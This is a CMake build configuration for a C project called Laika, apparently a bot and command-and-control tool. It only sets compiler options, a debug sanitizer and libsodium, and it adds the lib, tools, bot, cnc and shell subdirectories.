cmake_minimum_required(VERSION 3.10)
project(Laika)

set(CMAKE_C_STANDARD 11)
set(CMAKE_C_STANDARD_REQUIRED ON)

# Set the project as the default startup project for VS
set_property(DIRECTORY ${CMAKE_CURRENT_SOURCE_DIR} PROPERTY VS_STARTUP_PROJECT Laika)

# include our cmake modules
set(CMAKE_MODULE_PATH "${CMAKE_SOURCE_DIR}/cmake-modules" ${CMAKE_MODULE_PATH})

# Output binaries to the bin folder in the source directory
set(CMAKE_RUNTIME_OUTPUT_DIRECTORY ${CMAKE_SOURCE_DIR}/bin)
set(CMAKE_ARCHIVE_OUTPUT_DIRECTORY ${CMAKE_SOURCE_DIR}/bin)

#find_package(Sanitizers)

if(NOT CMAKE_BUILD_TYPE)
set(CMAKE_BUILD_TYPE Release)
endif()

string(TOLOWER ${CMAKE_BUILD_TYPE} RAWCMAKEBUILDTYPE)
message(STATUS "CMAKE_BUILD_TYPE: " ${RAWCMAKEBUILDTYPE})
if(RAWCMAKEBUILDTYPE STREQUAL "debug")
  message(STATUS "Adding sanitizer...")
  #set(SANITIZE_ADDRESS TRUE)
  #add_sanitizers(LaikaLib LaikaBot LaikaCNC)

  # bug in FindSanitizer.cmake ??? idfk, i'll investigate l8tr
  add_compile_options(-fsanitize=address)
  add_link_options(-fsanitize=address)
endif ()

# include libsodium
set(SODIUM_DISABLE_TESTS ON)
set(SODIUM_MINIMAL ON)
set(SODIUM_STATIC ON)
add_subdirectory(cmake-modules/libsodium)

# compile laikalib, tools, cnc & bot
add_subdirectory(lib)
add_subdirectory(tools)

# these subprojects don't support windows (sorry)
if(NOT WIN32)
  add_subdirectory(bot) # windows support Soon:tm:
  add_subdirectory(cnc)
  add_subdirectory(shell)
endif()
